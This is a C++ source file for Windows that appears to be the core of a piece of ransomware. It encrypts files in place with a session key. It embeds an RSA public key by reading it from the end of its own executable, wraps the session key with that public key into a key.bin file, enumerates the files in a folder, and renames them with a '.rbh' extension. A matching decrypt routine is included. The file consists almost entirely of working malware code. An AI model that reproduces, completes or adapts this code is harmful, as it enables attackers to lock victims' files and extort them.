#include <iostream>
#include <strsafe.h>
#include <fstream>
#include <string>
#include <Windows.h>
#include <ShlObj.h>
#include <vector>
#include <wincrypt.h>

#pragma comment (lib, "Crypt32.lib")

#define BLOCK_SIZE 16
#define RSA_KEY_BIN_LENGTH 532

void ErrorExit(LPTSTR lpszFunction)
{
	/* Retrieve the system error message for the last-error code */

	LPVOID lpMsgBuf;
	LPVOID lpDisplayBuf;
	DWORD dw = GetLastError();

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		dw,
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpMsgBuf,
		0, NULL);

	/* Display the error message and exit the process */

	lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
		(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)lpszFunction) + 40) * sizeof(TCHAR));
	StringCchPrintf((LPTSTR)lpDisplayBuf,
		LocalSize(lpDisplayBuf) / sizeof(TCHAR),
		TEXT("%s failed with error %d: %s"),
		lpszFunction, dw, lpMsgBuf);
	MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);

	LocalFree(lpMsgBuf);
	LocalFree(lpDisplayBuf);
	ExitProcess(dw);
}

int encrypt_file(std::string &filename, HCRYPTKEY &hKey) {

	std::ifstream iFile(filename, std::ios::binary);
	if (!iFile.is_open())
	{
		std::cerr << "Error opening file" << std::endl;
		return 1;
	}

	std::ofstream oFile(filename, std::ios::binary | std::ios::out | std::ios::in);
	if (!oFile.is_open())
	{
		std::cerr << "Error opening file" << std::endl;
		return 1;
	}
	BYTE buffer[BLOCK_SIZE];
	DWORD dwDataLen;
	do
	{
		iFile.read(reinterpret_cast<char *>(buffer), BLOCK_SIZE);
		dwDataLen = static_cast<DWORD>(iFile.gcount());
		if (!CryptEncrypt(hKey, NULL, iFile.eof(), 0, buffer, &dwDataLen, BLOCK_SIZE)) {
			ErrorExit("CryptEncrypt");
		}
		oFile.write(reinterpret_cast<char *>(buffer), dwDataLen);
	} while (!iFile.eof());
	iFile.close();
	oFile.close();
}

int decrypt_file(std::string &filename, HCRYPTKEY &hKey) {
	std::ifstream iFile(filename, std::ios::binary);
	if (!iFile.is_open())
	{
		std::cerr << "Error opening file" << std::endl;
		return 1;
	}

	std::ofstream oFile(filename, std::ios::binary | std::ios::out | std::ios::in);
	if (!oFile.is_open())
	{
		std::cerr << "Error opening file" << std::endl;
		return 1;
	}
	BYTE buffer[BLOCK_SIZE];
	DWORD dwDataLen = BLOCK_SIZE;
	do {
		iFile.read(reinterpret_cast<char *>(buffer), BLOCK_SIZE);
		CryptDecrypt(hKey, NULL, iFile.eof(), 0, buffer, &dwDataLen);
		oFile.write(reinterpret_cast<char *>(buffer), dwDataLen);
	} while (!iFile.eof());

	iFile.close();
	oFile.close();
	return 0;
}

BOOL importRSAKey(HCRYPTPROV &hProv, HCRYPTKEY &pubKey) {
	char execName[MAX_PATH];
	GetModuleFileName(NULL, execName, MAX_PATH);
	std::ifstream in(execName, std::ios::binary | std::ios::ate);
	if (!in)
	{
		std::cerr << "Cannot read itself" << std::endl;
		return FALSE;
	}
	in.seekg(-RSA_KEY_BIN_LENGTH, std::ios::end);
	std::vector<char> buffer(RSA_KEY_BIN_LENGTH);
	in.read(buffer.data(), buffer.size());

	if (!CryptImportKey(hProv, reinterpret_cast<const BYTE*>(buffer.data()), RSA_KEY_BIN_LENGTH, 0, CRYPT_EXPORTABLE, &pubKey))
	{
		return FALSE;
	}
	in.close();
	buffer.clear();
	return TRUE;
}



int export_key(std::string path, HCRYPTKEY &h_key, HCRYPTKEY &pubKey) {
	DWORD exported_key_size = 0;
	LPBYTE exported_key = NULL;

	if (!CryptExportKey(h_key, pubKey, SIMPLEBLOB, 0, NULL, &exported_key_size)) {
		std::cerr << "Cannot get the exported key size" << std::endl;
		ErrorExit("CryptExportKey");
	}
	exported_key = new BYTE[exported_key_size];

	if (!CryptExportKey(h_key, pubKey, SIMPLEBLOB, 0, exported_key, &exported_key_size)) {
		std::cerr << "Cannot export key" << std::endl;
		ErrorExit("CryptExportKey");
	}

	std::ofstream file_out(path + "key.bin", std::ios::binary);
	file_out.write(reinterpret_cast<const char*>(exported_key), exported_key_size);
	file_out.close();

	delete[] exported_key;
	return 0;
}

void findAllFilesInPath(std::vector<std::string>  &list, std::string path){
	WIN32_FIND_DATA findData;
	HANDLE hFind;

	hFind = FindFirstFile((path + "\\*").c_str(), &findData);

	if (hFind != INVALID_HANDLE_VALUE) {
		do {
			if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
				strcmp(findData.cFileName, "desktop.ini")) {
				list.push_back(path + "\\" + findData.cFileName);
			}
		} while (FindNextFile(hFind, &findData));

		FindClose(hFind);
	}
}

void renameFiles(std::vector<std::string> filePath){
	for (auto &it : filePath) {
		rename(it.c_str(), (it + ".rbh").c_str());
	}
}
